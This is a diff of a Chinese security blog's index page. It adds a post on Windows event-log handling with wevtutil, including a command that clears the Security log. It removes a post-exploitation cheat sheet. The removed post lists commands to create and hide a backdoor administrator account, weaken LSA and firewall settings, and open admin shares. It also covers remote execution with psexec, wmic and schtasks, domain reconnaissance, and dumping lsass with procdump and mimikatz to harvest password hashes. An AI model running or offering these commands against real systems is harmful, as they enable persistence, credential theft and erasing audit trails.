@@ -142,6 +142,75 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://zsjevilhex.github.io/archives/2020/04/20/WindowsEventLog/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="evilhex">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="evilhex">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/04/20/WindowsEventLog/" class="post-title-link" itemprop="url">WindowsEventLog</a>
+        </h2>
+
+        <div class="post-meta">
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-04-20 20:05:02" itemprop="dateModified" datetime="2020-04-20T20:05:02+08:00">2020-04-20</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="1、log-文件存储位置："><a href="#1、log-文件存储位置：" class="headerlink" title="1、log 文件存储位置："></a>1、log 文件存储位置：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wevtutil gl System /f:xml <span class="comment">#查看配置文件命令，有日志存储的路径</span></span><br><span class="line"></span><br><span class="line">%SystemRoot%\System32\Config             <span class="comment">#xp/windows server 2003</span></span><br><span class="line">%SystemRoot%\system32\winevt\logs        <span class="comment">#Windows Vista/7/Server2008 location</span></span><br><span class="line">AppEvent.Evt <span class="comment">#应用程序日志</span></span><br><span class="line">SecEvent.Evt <span class="comment">#安全日志</span></span><br><span class="line">SysEvent.Evt <span class="comment">#系统日志</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2、导出日志："><a href="#2、导出日志：" class="headerlink" title="2、导出日志："></a>2、导出日志：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wevtutil.exe epl Security 1.evtx         <span class="comment">#导出安全日志命令</span></span><br><span class="line">wevtutil cl Security /bu:C:\admin\backups\a10306.evtx <span class="comment">#导出日志前清除安全日志</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="3、日志管理工具：WevtUtil-exe"><a href="#3、日志管理工具：WevtUtil-exe" class="headerlink" title="3、日志管理工具：WevtUtil.exe"></a>3、日志管理工具：WevtUtil.exe</h2><h3 id="3-1、获取日志记录："><a href="#3-1、获取日志记录：" class="headerlink" title="3.1、获取日志记录："></a>3.1、获取日志记录：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wevtutil.exe qe Security /f:text /c:10               <span class="comment">#获取security日中最近10条记录，TEXT格式</span></span><br><span class="line">wevtutil.exe qe Security /f:xml /rd:<span class="literal">true</span> /c:10       <span class="comment">#获取security日中最近10条记录，xml格式(有EventRecordID)</span></span><br></pre></td></tr></table></figure>
+<h3 id="3-2、日志记录筛选："><a href="#3-2、日志记录筛选：" class="headerlink" title="3.2、日志记录筛选："></a>3.2、日志记录筛选：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wevtutil epl Security 1.evtx <span class="string">"/q:*[System [(EventRecordID&gt;13032) or (EventRecordID&lt;13030)]]"</span>  <span class="comment">#根据EventRecordId筛选</span></span><br><span class="line">wevtutil epl Security 1.evtx <span class="string">"/q:*[System [TimeCreated[@SystemTime &gt;'2018-08-10T03:21:00' or @SystemTime &lt;'2018-08-10T03:20:00']]]"</span>   <span class="comment">#根据时间段筛选</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3、系统日志高级应用：获取域用户登录IP："><a href="#3-3、系统日志高级应用：获取域用户登录IP：" class="headerlink" title="3.3、系统日志高级应用：获取域用户登录IP："></a>3.3、系统日志高级应用：获取域用户登录IP：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe security /format:text /q:<span class="string">"Event[System[(EventID=4624)] and EventData[Data[@Name='TargetUserName']='domainuser']]"</span>   <span class="comment">#获取完整信息</span></span><br><span class="line">wevtutil qe security /format:text /q:<span class="string">"Event[System[(EventID=4624)] and EventData[Data[@Name='TargetUserName']='domainuser']]"</span>|find <span class="string">"Source Network Address"</span> <span class="comment">#获取IP信息</span></span><br><span class="line">wevtutil qe security /format:text /c:1000 /q:<span class="string">"Event[System[(EventID=4624)] and EventData[Data[@Name='TargetUserName']='domainuser']]"</span>|find <span class="string">"Source Network Address"</span> <span class="comment">#从前1000条中获取</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-4、如何从导出文件中查询："><a href="#3-4、如何从导出文件中查询：" class="headerlink" title="3.4、如何从导出文件中查询："></a>3.4、如何从导出文件中查询：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe export.xml /sq:<span class="literal">true</span> /rd:<span class="literal">true</span> /f:text  <span class="comment">#export.xml为你导出的结果</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="4-界面打开event-log："><a href="#4-界面打开event-log：" class="headerlink" title="4. 界面打开event log："></a>4. 界面打开event log：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eventvwr.msc  <span class="comment">#windows窗口</span></span><br><span class="line"><span class="comment">#or</span></span><br><span class="line">eventvwr</span><br></pre></td></tr></table></figure>
+<h3 id="复制的evtx文件由于head的错误，并不能用该软件打开，修复或者移步UE"><a href="#复制的evtx文件由于head的错误，并不能用该软件打开，修复或者移步UE" class="headerlink" title="复制的evtx文件由于head的错误，并不能用该软件打开，修复或者移步UE"></a>复制的evtx文件由于head的错误，并不能用该软件打开，修复或者移步UE</h3>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://zsjevilhex.github.io/archives/2020/04/18/PortInfo/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -758,118 +827,11 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://zsjevilhex.github.io/archives/2020/04/13/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="evilhex">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="evilhex">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/04/13/hello-world/" class="post-title-link" itemprop="url">实用命令</a>
-        </h2>
-
-        <div class="post-meta">
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-04-17 20:36:24" itemprop="dateModified" datetime="2020-04-17T20:36:24+08:00">2020-04-17</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Command/" itemprop="url" rel="index"><span itemprop="name">Command</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="1、REG常用命令"><a href="#1、REG常用命令" class="headerlink" title="1、REG常用命令"></a>1、REG常用命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###1.1、添加、删除、查询、导出注册表：</span></span><br><span class="line">reg add <span class="string">"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span> /v systray /t REG_SZ /d <span class="string">"%SystemRoot%\system32\systray.exe"</span> /f</span><br><span class="line">reg query <span class="string">"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span> </span><br><span class="line">reg delete <span class="string">"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TrayNotify"</span> /v IconStreams /f</span><br><span class="line">reg compare <span class="string">"hkcu\software\microsoft\winmine"</span> <span class="string">"hkcu\software\microsoft\winmine"</span> /od /s</span><br><span class="line">reg copy <span class="string">"hkcu\software\microsoft\winmine"</span> <span class="string">"hkcu\software\microsoft\winminebk"</span> /s /f</span><br><span class="line">reg <span class="built_in">export</span> <span class="string">"hkcu\software\microsoft\winmine"</span> c:\data\regbackups\wmbkup.reg</span><br><span class="line"></span><br><span class="line"><span class="comment">###1.2、添加、删除DLL服务：</span></span><br><span class="line">net stop appmgmt</span><br><span class="line">reg add  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AppMgmt /v Start     /t REG_DWORD /d 2 /f</span><br><span class="line">reg add  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AppMgmt /v ImagePath /t REG_EXPAND_SZ /d <span class="string">"%SystemRoot%\sysWOW64\svchost.exe -k netsvcs"</span> /f</span><br><span class="line">reg add  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AppMgmt\Parameters /v ServiceDll /t REG_EXPAND_SZ /d %SystemRoot%\sysWOW64\AppMgnts.dll /f</span><br><span class="line">net start appmgmt</span><br><span class="line"></span><br><span class="line"><span class="comment">###1.3、添加、删除EXE服务:</span></span><br><span class="line">sc create test_sevrer binpath= <span class="string">"D:\test_sevrer\test_sevrer.exe"</span> start= auto </span><br><span class="line">sc create PolicyAgent binpath= <span class="string">"C:\WINDOWS\system32\lsass.exe"</span> <span class="built_in">type</span>= share start= auto displayname= <span class="string">"IPSEC Services"</span> depend= RPCSS/Tcpip/IPSec </span><br><span class="line">可通过下面BAT文件：</span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">SET ServerName=coderserver</span><br><span class="line">SET ServerExeFile=%ServerName%.exe</span><br><span class="line">sc create %ServerName% binPath= <span class="string">"%~dp0%ServerExeFile%"</span> start= auto</span><br><span class="line">sc config %ServerName% <span class="built_in">type</span>= interact <span class="built_in">type</span>= own</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"%~dp0%ServerExeFile%"</span></span><br><span class="line">pause</span><br><span class="line"></span><br><span class="line"><span class="comment">###1.4、添加、删除EXE服务:</span></span><br><span class="line"><span class="built_in">set</span> s32=C:\<span class="built_in">test</span></span><br><span class="line"><span class="built_in">set</span> service_name=TestSer1</span><br><span class="line"><span class="built_in">set</span> prog_path=C:\<span class="built_in">test</span></span><br><span class="line"><span class="built_in">set</span> prog_name=bb.bat</span><br><span class="line">%s32%\instsrv.exe %service_name% %s32%\srvany.exe</span><br><span class="line">reg add <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\%service_name%\Parameters"</span> /v Application /t REG_SZ /d <span class="string">"%prog_path%\%prog_name%"</span> /f</span><br><span class="line">reg add <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\%service_name%\Parameters"</span> /v AppDirectory /t REG_SZ /d <span class="string">"%prog_path%"</span> /f</span><br></pre></td></tr></table></figure>
-<h2 id="2、远程命令执行"><a href="#2、远程命令执行" class="headerlink" title="2、远程命令执行"></a>2、远程命令执行</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">at          \\127.0.0.1  7:03  c:\windows\test.exe</span><br><span class="line">schtasks    /create  /s 127.0.0.1  /tn <span class="string">"tname"</span> /tr  c:\windows\test.exe  /sc daily /st 07:17:00 /ed 2100/12/31</span><br><span class="line">psexec.exe  -accepteula //127.0.0.1 /u admin /p 123 -s -d  <span class="string">"c:\windows\test.exe"</span></span><br><span class="line">wmic        /node:<span class="string">"127.0.0.1"</span> /user:admin /password:123 process call create <span class="string">"c:\windows\test.exe"</span></span><br><span class="line">powershell /<span class="built_in">command</span> <span class="variable">$Username</span> = <span class="string">'admin'</span>;<span class="variable">$Password</span> = <span class="string">'123'</span>;<span class="variable">$pass</span> = ConvertTo-SecureString -AsPlainText <span class="variable">$Password</span> -Force;<span class="variable">$Cred</span> = New-Object System.Management.Automation.PSCredential -ArgumentList <span class="variable">$Username</span>,<span class="variable">$pass</span>;Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock &#123; cmd /c ping google.com -n 2&#125; -credential <span class="variable">$Cred</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="3、信息搜集"><a href="#3、信息搜集" class="headerlink" title="3、信息搜集"></a>3、信息搜集</h2><h3 id="3-1、基本信息搜集"><a href="#3-1、基本信息搜集" class="headerlink" title="3.1、基本信息搜集"></a>3.1、基本信息搜集</h3><pre><code>whoami                                   # 查看当前用户
-set                                      # 查看环境变量
-net user                                 # 查看所有用户
-query                                    # 查看当前在线用户
-ipconfig /all                            # 查看当前主机的主机名/IP/DNS等信息
-route print                              # 查看路由表信息
-netstat -ano                             # 查看端口开放情况
-arp -a                                   # 查看arp解析情况
-tasklist /svc                            # 查看进程及对应服务名
-net localgroup administrators            # 查看管理员组成员
-systeminfo                               # 查看系统信息含补丁信息
-net use                                  # 查看ipc连接情况
-net view                                 # 查看匿名共享情况
-net share                                # 查看共享文件夹
-net localgroup administrators            # 查看本地管理员
-netsh firewall show state                # 查看防火墙状态
-netsh firewall show config               # 查看防火墙配置
-cmdkey /l                                # 查看当前保存的登陆凭证
-dir %APPDATA%\Microsoft\Windows\Recent   # 查看最近打开的文档
-netsh wlan show profiles                 # 查看连接过的wifi名称
-netsh interface show interface           # 查看网络接口
-wmic startup list brief                  # 查看自启动项
-dir /a %userprofile%\AppData\Local\Microsoft\Credentials* # 查看RDP连接凭证</code></pre><h3 id="3-2、连通性"><a href="#3-2、连通性" class="headerlink" title="3.2、连通性"></a>3.2、连通性</h3><pre><code>ping     www.google.com             # ICMP连通性
-nslookup www.google.com             # DNS连通性
-curl     https://www.google.com     # http连通性
-nc ip port                          # TCP连通性</code></pre><h3 id="3-3、域信息搜集"><a href="#3-3、域信息搜集" class="headerlink" title="3.3、域信息搜集"></a>3.3、域信息搜集</h3><pre><code>net config workstation                      # 查看当前登录域
-net user /domain                            # 获得所有域用户列表
-net view /domain                            # 查看所有的域
-net view /domain:XXX                        # 查看域内某台主机详情
-net group /domain                           # 查看所有域用户组列表
-net group &quot;domain computers&quot; /domain        # 查看域内所有的主机名
-net group &quot;domain admins&quot; /domain           # 查看所有域管理员
-net group &quot;domain controllers&quot; /domain      # 查看所有域控制器
-net group &quot;enterprise admins&quot; /domain       # 查看所有企业管理员
-nltest /domain_trusts                       # 获取域信任信息
-net time /domain                            # 查看当前登录域
-net accounts /domain                        # 查看域密码策略
-dsquery server                              # 寻找目录中的域控制器
-setspn.exe -T xx.xx.xx.xx -Q /              # 查看当前域内所有spn</code></pre><h2 id="4、添加隐藏用户、计划任务、更新组策略："><a href="#4、添加隐藏用户、计划任务、更新组策略：" class="headerlink" title="4、添加隐藏用户、计划任务、更新组策略："></a>4、添加隐藏用户、计划任务、更新组策略：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">net user HelpSuport /del /y</span><br><span class="line">net user HelpSuport$ password /add /y</span><br><span class="line">net localgroup Administrators HelpSuport$ /add /y</span><br><span class="line">reg add <span class="string">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"</span> /v <span class="string">"HelpSuport$"</span> /t REG_DWORD /d 0 /f</span><br><span class="line">reg add <span class="string">"HKLM\SYSTEM\CurrentControlSet\Control\Lsa"</span> /v <span class="string">"forceguest"</span> /t REG_DWORD /d 0 /f</span><br><span class="line">reg add <span class="string">"HKLM\SYSTEM\CurrentControlSet\Control\Lsa"</span> /v <span class="string">"LmCompatibilityLevel"</span> /t REG_DWORD /d 0 /f</span><br><span class="line">reg add <span class="string">"HKLM\software\microsoft\windows\currentversion\policies\system"</span> /v <span class="string">"LocalAccountTokenFilterPolicy"</span> /t REG_DWORD /d 1 /f</span><br><span class="line">cmd /c netsh advfirewall firewall <span class="built_in">set</span> rule group=<span class="string">"File and Printer Sharing"</span> new <span class="built_in">enable</span>=Yes</span><br><span class="line">cmd /c reg add <span class="string">"HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile\Services\FileAndPrint"</span> /v <span class="string">"Enabled"</span> /t REG_DWORD /d 1 /f</span><br><span class="line">reg add <span class="string">"HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile\Services\FileAndPrint"</span> /v <span class="string">"RemoteAddresses"</span> /t REG_SZ /d * /f</span><br><span class="line">reg add <span class="string">"HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile\Services\FileAndPrint"</span> /v <span class="string">"Enabled"</span> /t REG_DWORD /d 1 /f</span><br><span class="line">reg add <span class="string">"HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile\Services\FileAndPrint"</span> /v <span class="string">"RemoteAddresses"</span> /t REG_SZ /d * /f</span><br><span class="line">reg add <span class="string">"HKLM\SYSTEM\CurrentControlSet\Services\Schedule"</span> /v <span class="string">"Start"</span> /t REG_DWORD /d 2 /f</span><br><span class="line">sc start Schedule</span><br><span class="line">reg add <span class="string">"HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer"</span> /v <span class="string">"Start"</span> /t REG_DWORD /d 2 /f</span><br><span class="line">reg add <span class="string">"HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"</span> /v <span class="string">"AutoShareServer"</span> /t REG_DWORD /d 1 /f</span><br><span class="line">reg add <span class="string">"HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"</span> /v <span class="string">"AutoShareWks"</span> /t REG_DWORD /d 1 /f</span><br><span class="line">sc start LanmanServer</span><br><span class="line">gpupdate /force /<span class="built_in">wait</span>:0</span><br><span class="line">del %0</span><br></pre></td></tr></table></figure>
-
-<h2 id="5、打开IPC"><a href="#5、打开IPC" class="headerlink" title="5、打开IPC$:"></a>5、打开IPC$:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">net start lanmanServer</span><br><span class="line">netsh firewall set portopening TCP 139 ENABLE</span><br><span class="line">netsh firewall set portopening TCP 445 ENABLE</span><br><span class="line">netsh firewall set portopening UDP 137 ENABLE</span><br><span class="line">netsh firewall set portopening UDP 138 ENABLE</span><br><span class="line">netsh firewall set icmpsetting all ENABLE</span><br><span class="line"></span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa&quot; &#x2F;v &quot;forceguest&quot; &#x2F;t REG_DWORD &#x2F;d &quot;0&quot; &#x2F;f</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa&quot; &#x2F;v &quot;limitblankpassworduse&quot; &#x2F;t REG_DWORD &#x2F;d &quot;0&quot; &#x2F;f</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa&quot; &#x2F;v &quot;restrictanonymous&quot; &#x2F;t REG_DWORD &#x2F;d &quot;0&quot; &#x2F;f</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa&quot; &#x2F;v &quot;restrictanonymoussam&quot; &#x2F;t REG_DWORD &#x2F;d &quot;0&quot; &#x2F;f</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System&quot; &#x2F;v &quot;LocalAccountTokenFilterPolicy&quot; &#x2F;t REG_DWORD &#x2F;d &quot;1&quot; &#x2F;f</span><br><span class="line"></span><br><span class="line">net user admin &#x2F;active &#x2F;yes</span><br><span class="line">net user administrator &#x2F;active &#x2F;yes</span><br><span class="line">net share IPC$</span><br><span class="line">net share C$&#x3D;C:\</span><br><span class="line">net share ADMIN$&#x3D;C:\WINDOWS</span><br></pre></td></tr></table></figure>
-<h2 id="6、自启动查询："><a href="#6、自启动查询：" class="headerlink" title="6、自启动查询："></a>6、自启动查询：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get caption,command 2&gt;nul &amp; ^</span><br><span class="line">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run 2&gt;nul &amp; ^</span><br><span class="line">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce 2&gt;nul &amp; ^</span><br><span class="line">reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run 2&gt;nul &amp; ^</span><br><span class="line">reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce 2&gt;nul &amp; ^</span><br><span class="line">dir &#x2F;b &quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot; 2&gt;nul &amp; ^</span><br><span class="line">dir &#x2F;b &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot; 2&gt;nul &amp; ^</span><br><span class="line">dir &#x2F;b &quot;%programdata%\Microsoft\Windows\Start Menu\Programs\Startup&quot; 2&gt;nul &amp; ^</span><br><span class="line">dir &#x2F;b &quot;%appdata%\Microsoft\Windows\Start Menu\Programs\Startup&quot; 2&gt;nul</span><br><span class="line">schtasks &#x2F;query &#x2F;fo TABLE &#x2F;nh | findstr &#x2F;v &#x2F;i &quot;disable deshab&quot;</span><br></pre></td></tr></table></figure>
-<h2 id="7、口令获取命令"><a href="#7、口令获取命令" class="headerlink" title="7、口令获取命令"></a>7、口令获取命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###3.1、通过抓取lsass内存获取用户NTLM HASH:</span></span><br><span class="line">procdump32.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz.exe <span class="string">"sekurlsa::minidump lsass.dmp"</span> <span class="string">"sekurlsa::logonPasswords full"</span> <span class="built_in">exit</span> &gt;password.txt</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+  </nav>
 
 
 
@@ -936,7 +898,7 @@ setspn.exe -T xx.xx.xx.xx -Q /              # 查看当前域内所有spn</code>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-count">11</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
